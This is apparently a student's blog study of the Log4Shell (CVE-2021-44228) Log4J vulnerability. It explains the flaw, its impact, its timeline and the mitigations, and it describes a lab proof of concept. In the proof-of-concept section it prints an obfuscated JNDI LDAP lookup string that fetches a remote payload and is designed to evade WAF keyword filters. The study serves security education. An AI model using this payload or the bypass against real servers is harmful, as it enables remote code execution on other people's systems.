### Study on CVE-2021–44228: Log4Shell — Log4J RCE Vulnerability

Apache Log4J is a popular logging tool for Java software.

Besides the normal logging function with text information, Log4J supports various lookups within the log that add flexibility for users to add dynamic queries within logs. When logging, Log4J supports a feature *lookup* to perform a string substitution on the form *${prefix:content}.*

For example, an environment lookup like *${java:os}* can be used to get the OS information and output to logs.

![img](https://cdn-images-1.medium.com/max/1200/1*ygesFyCgenIDYW2wHaze1Q.png)

### Flaw

When passing a string to the Log4J logger without performing contents check, no matter where the string comes from, if the string contains a lookup, the logger will execute every lookup expression within the string.

One of the lookups is JNDI lookup *${jndi:path/context-name}*, which could be used to retrieve variables via JNDI API when logging. However, JNDI lookup supports protocols like RMI and LDAP to fetch resources remotely.

The resource could be a serialized Java Object hosted by a remote server, fetched via resolving LDAP or RMI reference. Log4J does not check or filter the result from the LDAP request through JNDI lookup by default.

### Vulnerability

Therefore, an attacker could initialize a remote Java code execution attack by putting a string of a JNDI lookup containing an attacker-controlled LDAP address in the request payload, and send this request to the server using any protocols that the target server supports (for example, pass the exploit string when entering the username or email address).

If the server is using Log4J, there is a high probability that the server’s Log4J logger will perform a JNDI lookup when logging the attacker’s input. Then, the target server will pull executable code from the attacker-controlled LDAP service and execute it eventually.

### Imapct

Since Apache Log4J is a ubiquitous logging utility in the industry. Focusing solely on Apache’s own projects, there are 21 projects have been affected out of 41 projects in total, including commonly used projects like Struts, Flink, JMeter. Affected web services include AWS, Cloudflare, iCloud, and so on. Even the popular game Minecraft was vulnerable to a *Log4Shell* attack.

Due to its incredible severity, it got a 10/10 score (most critical) in the CVSS rating system. According to an analysis conducted by EY and Wiz, this vulnerability affected 93% of enterprise cloud systems.

### Lifecycle and Mitigations

In 2013, Apache merged a JNDI lookup plugin as a useful add-on, and set it enabled by default since version.

After 8 years, this vulnerability is first reported by Alibaba Cloud’s security team on November 24, 2021. Apache released the first mitigation update of Log4J (version 2.15.0) on December 6, 2021.

On December 10, 2021, the related CVE is published.

The affected versions of Log4J are from 2.0-beta9 to 2.14.1. However, more vulnerabilities were found during the release of version 2.15.0 to 2.17.0, and 3 more CVEs were published.

As of Log4J 2.17.0 JNDI operations require that *log4j2.enableJndiLookup=true* be set as a system property or the corresponding environment variable for this lookup to function.

JNDI functionality has been hardened in these versions: 2.3.1, 2.12.2, 2.12.3 or 2.17.0. From these versions onwards, support for the LDAP protocol has been removed and only the Java protocol is supported in JNDI connections.

Therefore, users of Log4J should upgrade their Log4J version to 2.17.1 or a newer version at this moment.

### Proof of Concept

The process of attack on \textit{Log4Shell} vulnerability is illustrated as Figure 1.

On the attacker side, we need to prepare

1. a Java class containing code we want to execute,
2. an LDAP server and,
3. an HTTP server.

First, I create a Java class Payload (see top-right window of Figure), and compile it into a .class file.

Once executed, this class will create a new pwned.txt file under /tmp directory on the target machine.

Then, I start a python HTTP server at 8000 port to host the malicious code (see top-left of Figure 8),

and use the marshalsec toolkit to start an LDAP server at 1389 (see top-middle of Figure 8).



On the target server side, I choose Spring to start a HTTP web server at port 8080, and use Log4J 2.14.1 to log header of HTTP requests (see bottom-left of Figure).

After setting up the testing environment. The attack can be initialized by just sending a single HTTP request to the target server.

The request is quite simple, it includes a JNDI lookup string somewhere in header.

![img](https://cdn-images-1.medium.com/max/1200/1*g063_p0FHTE2CngajOyu4Q.png)

In a real-life scenario, the attacker needs to try different request sections or input fields on forms to inject the lookup string.

After the target server receives this request, the Log4J logger will run the JNDI lookup and eventually execute payload.class fetched from the attacker-controlled LDAP server. The attacker could take control of the target device by establishing a reverse TCP connection, or even gain the root privilege together with post-exploitation methods to take full control of the target system.

Moreover, the attacker could obfuscate the lookup expression to bypass the keyword check mechanism of the server by using Log4J’s own string substitution lookups.

If the target machine is using detection like the web application firewall that rejects all requests containing a “{jndi:|’’ fragment, the attacker can easily bypass this detection by using other substitution methods like the upper or lower.

*${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://10.13.37.105/payload}*

### Trace

Since this vulnerability occurs on a logging utility. After a JNDI lookup, logger will leave a log of the malicious JNDI lookup string as in Figure 9 (bottom-left).

![img](https://cdn-images-1.medium.com/max/1200/1*BQBPL9E9skL6zqk1tFBbFQ.png)

### Conclusion

After studying the Log4Shell vulnerability, I am impressed that such a simple flaw leads to a disaster in the industry. Therefore, when updating a popular tool, the organization should let users know what has changed and should set the new feature as opt-in (disabled by default).

On the other hand, from the aspect of developers, we should know more about the tools they are using, especially the configurations, to prevent any unexpected potential vulnerability, and use security mechanisms layered together to ensure that the failure of a single flaw does not lead to a full damage.